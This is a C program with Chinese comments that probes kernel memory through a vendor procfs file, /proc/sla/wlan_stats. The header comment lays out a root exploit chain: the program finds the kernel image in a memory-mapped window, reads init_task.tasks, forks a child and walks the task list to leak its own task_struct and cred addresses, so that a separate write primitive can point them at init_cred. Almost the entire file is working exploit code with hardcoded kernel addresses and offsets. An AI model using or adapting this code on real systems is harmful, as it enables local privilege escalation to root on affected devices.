/* imgprobe.c — 只读探针: **内核镜像(Image)自己的物理页在不在 /proc/sla 的读窗口里?**
 *
 * 为什么这一问值一条 root 路线:
 *   `init_task.tasks`(+0x6b0/+0x6b8) 是 **.data 里的静态链表头**, 5.4 的 copy_process 用
 *   `list_add_tail_rcu(&p->tasks, &init_task.tasks)` ⇒ **`tasks.prev` = 最后一次 clone 出来的 task**。
 *   我们只要**先 fork 一个孩子**, 那一格就是"我们刚刚造的 task 的真身地址"(动态地址!)。
 *   拿到 `T` 之后, `T+0x840/T+0x848`(real_cred/cred) 就是**两个已知的可写核地址** ⇒
 *   用已经证实的形状(2) 指针写把它们都顶成 `init_cred+slide` ⇒ uid/gid=0 + 全 caps,
 *   配对写只会把 `init_cred.usage` 改成一个核指针大小的数 ⇒ refcount 永不归零 ⇒ 不会释放(安全)。
 *   ⇒ 整条链**不需要我们的 task/cred 落在窗口里**, 只需要 **镜像在窗口里**(本探针就是来验这一句)。
 *
 * 用法: imgprobe [slide_hex]  ⇒ 输出 banner 在窗口里的偏移 W, 以及 M = banner运行时VA - W,
 *        再用 M 把 init_task.tasks / init_cred 读出来。全程只读。 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>

#define LK_BANNER     0xffffffc01210f698ULL   /* const char linux_banner[]  (.data) */
#define LK_INIT_TASK  0xffffffc01292e200ULL
#define TASK_TASKS    0x6b0                    /* +0x6b0 next / +0x6b8 prev */
#define LK_INIT_CRED  0xffffffc01293d528ULL
#define TASK_CRED     0x840                    /* real_cred +0x840 / cred +0x848 */

static sigjmp_buf jb;
static volatile int on;
static void sbb(int s) { (void)s; if (on) siglongjmp(jb, 1); }
static uint64_t q(const unsigned char *p, size_t o) { uint64_t v; memcpy(&v, p + o, 8); return v; }
static int cmp64(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return x < y ? -1 : (x > y ? 1 : 0);
}
static uint64_t find_base(const unsigned char *m, const unsigned char *ok, size_t np, size_t *cnt_out) {
  size_t cap = 4u << 20, n = 0;
  uint64_t *kv = malloc(cap * sizeof *kv);
  if (!kv) return 0;
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 8 <= (i + 1) * 4096u; o += 8) {
      uint64_t v = q(m, o);
      if ((v >> 48) != 0xffffULL || v <= o) continue;
      if (n < cap) kv[n++] = (v - o) & ~0xfffULL;
    }
  }
  qsort(kv, n, sizeof *kv, cmp64);
  uint64_t best = 0; size_t bestn = 0, run = 1;
  for (size_t i = 1; i <= n; i++) {
    if (i < n && kv[i] == kv[i - 1]) run++;
    else { if (run > bestn) { bestn = run; best = kv[i - 1]; } run = 1; }
  }
  free(kv);
  if (cnt_out) *cnt_out = bestn;
  return best;
}

int main(int argc, char **argv) {
  uint64_t slide = argc > 1 ? strtoull(argv[1], NULL, 0) : 0;
  const char *mark = argc > 2 ? argv[2] : "IMGB7q2Xk9Zt4Vr";
  char nm[16];
  snprintf(nm, sizeof nm, "%.15s", mark);
  prctl(PR_SET_NAME, nm, 0, 0, 0);
  int fd = open("/proc/sla/wlan_stats", O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("open errno=%d(%s)\n", errno, strerror(errno)); return 1; }
  size_t L = 0;
  unsigned char *m = MAP_FAILED;
  for (size_t s = (2ull << 30); s >= (16u << 20); s >>= 1) {
    m = mmap(NULL, s, PROT_READ, MAP_SHARED, fd, 0);
    if (m != MAP_FAILED) { L = s; break; }
  }
  if (m == MAP_FAILED) { printf("mmap 失败 errno=%d\n", errno); return 2; }
  struct sigaction sa, old;
  memset(&sa, 0, sizeof sa); sa.sa_handler = sbb; sigemptyset(&sa.sa_mask);
  sigaction(SIGBUS, &sa, &old);
  size_t np = L / 4096u, okp = 0;
  unsigned char *ok = calloc(np, 1);
  for (size_t i = 0; i < np; i++) {
    on = 1;
    if (sigsetjmp(jb, 1) == 0) { volatile char c = m[i * 4096u]; (void)c; ok[i] = 1; okp++; }
    on = 0;
  }
  size_t bcnt = 0;
  uint64_t K = find_base(m, ok, np, &bcnt);
  printf("[IP] 窗口 len=%zu MB 可读页 %zu/%zu 基址 K=%016llx(自洽 %zu)\n",
         L >> 20, okp, np, (unsigned long long)K, bcnt);

  /* (A) 找 linux_banner 的前缀 ⇒ 镜像在不在窗口里 */
  const char *pat = "Linux version ";
  size_t pl = strlen(pat);
  size_t hit[8]; int nh = 0;
  for (size_t i = 0; i < np && nh < 8; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + pl + 80 <= L && o < (i + 1) * 4096u; o++) {
      if (m[o] != 'L' || memcmp(m + o, pat, pl)) continue;
      hit[nh++] = o;
      char txt[81];
      memcpy(txt, m + o, 80);
      txt[80] = 0;
      for (int c = 0; c < 80; c++) if ((unsigned char)txt[c] < 0x20 || (unsigned char)txt[c] > 0x7e) txt[c] = '.';
      printf("[IP] banner#%d @ +%zu (0x%zx) : \"%s\"\n", nh, o, o, txt);
      break;
    }
  }
  if (!nh) { printf("[IP] × 窗口里没有 linux_banner ⇒ 镜像不在这段物理内存里\n"); }
  if (!nh || !slide) { munmap(m, L); return nh ? 0 : 3; }

  size_t W = hit[0];
  uint64_t M = (LK_BANNER + slide) - W;             /* 镜像运行时 VA = M + 窗口偏移 */
  printf("[IP] slide=%llx ⇒ M=%016llx (镜像里任一 VA X 对应窗口偏移 X-M)\n",
         (unsigned long long)slide, (unsigned long long)M);

  /* (B) 读 init_task.tasks(静态链表头) ⇒ tasks.prev = 最后一次 clone 的 task */
  uint64_t it = LK_INIT_TASK + slide;
  size_t io = (size_t)(it + TASK_TASKS - M);
  if (io + 0x10 > L || !ok[io / 4096u]) {
    printf("[IP] × init_task.tasks 的窗口偏移 +%zu 不可读 ⇒ 停\n", io);
    munmap(m, L); return 4;
  }
  uint64_t tn = q(m, io), tp = q(m, io + 8);
  printf("[IP] init_task@%016llx (窗口 +%zu)  tasks.next=%016llx  tasks.prev=%016llx\n",
         (unsigned long long)it, io, (unsigned long long)tn, (unsigned long long)tp);
  /* (C) 先造一个孩子并让它挂着 ⇒ 它就是"最后一次 clone 的 task" ⇒ tasks.prev 应当就是它 */
  pid_t kid = fork();
  if (kid == 0) { usleep(25 * 1000 * 1000); _exit(0); }
  usleep(300 * 1000);
  io = (size_t)(it + TASK_TASKS - M);
  if (io + 0x10 > L || !ok[io / 4096u]) { printf("[IP] × fork 后 tasks 不可读 ⇒ 停\n"); return 4; }
  tn = q(m, io); tp = q(m, io + 8);
  printf("[IP] fork 之后: tasks.next=%016llx tasks.prev=%016llx (prev 应当是我们的孩子)\n",
         (unsigned long long)tn, (unsigned long long)tp);
  /* (D) 沿 prev 走 6 步, 每步都试着读那个 task, 找我们的 comm 标记 */
  uint64_t cur = tp;
  for (int step = 0; step < 6 && cur; step++) {
    if (cur <= K || cur - K >= L) { printf("[IP]  步%d: task=%016llx 不在窗口里 ⇒ 链走停在这里\n", step,
                                           (unsigned long long)cur); break; }
    size_t to = (size_t)(cur - K);                 /* 这是 &p->tasks 的窗口偏移 */
    if (!ok[to / 4096u]) { printf("[IP]  步%d: 页不可读 ⇒ 停\n", step); break; }
    size_t T = to > 0x6b0 ? to - 0x6b0 : 0;
    size_t found = 0;
    for (size_t o = T; o + pl + 16 <= L && o < T + 0x1400; o++)
      if (m[o] == nm[0] && !memcmp(m + o, nm, strlen(nm))) { found = o; break; }
    uint64_t cr1 = q(m, T + TASK_CRED), cr2 = q(m, T + TASK_CRED + 8);
    uint32_t prio = 0, sprio = 0;
    memcpy(&prio, m + T + 0xb4, 4); memcpy(&sprio, m + T + 0xb8, 4);
    printf("[IP]  步%d tasks@+%zu ⇒ T=+%zu (VA %016llx) prio=%u/%u real_cred=%016llx cred=%016llx 标记=%s\n",
           step, to, T, (unsigned long long)(K + T), prio, sprio,
           (unsigned long long)cr1, (unsigned long long)cr2, found ? "命中(是我们的 task)" : "无");
    if (found && cr1 == cr2 && (cr1 >> 48) == 0xffffULL) {
      /* 再把 cred 本身读回来核对 id 字段 */
      if (cr1 > K && cr1 - K + 0x30 <= L && ok[(cr1 - K) / 4096u]) {
        size_t co = (size_t)(cr1 - K);
        printf("[IP]  cred 内容(off=+%zu): %016llx %016llx %016llx %016llx\n",
               co, (unsigned long long)q(m, co), (unsigned long long)q(m, co + 8),
               (unsigned long long)q(m, co + 16), (unsigned long long)q(m, co + 24));
        printf("[IP] *** 拿到自己的 task 与 cred: TASK=%llx CRED=%llx ***\n",
               (unsigned long long)(K + T), (unsigned long long)cr1);
        printf("TASK=%llx\nCRED=%llx\n", (unsigned long long)(K + T), (unsigned long long)cr1);
      } else printf("[IP]  cred 不在窗口里(只拿到地址)\n");
      break;
    }
    cur = q(m, to);                                /* 继续沿 prev 往前(方向: 更早的 task) */
  }
  munmap(m, L);
  close(fd);
  return 0;
}
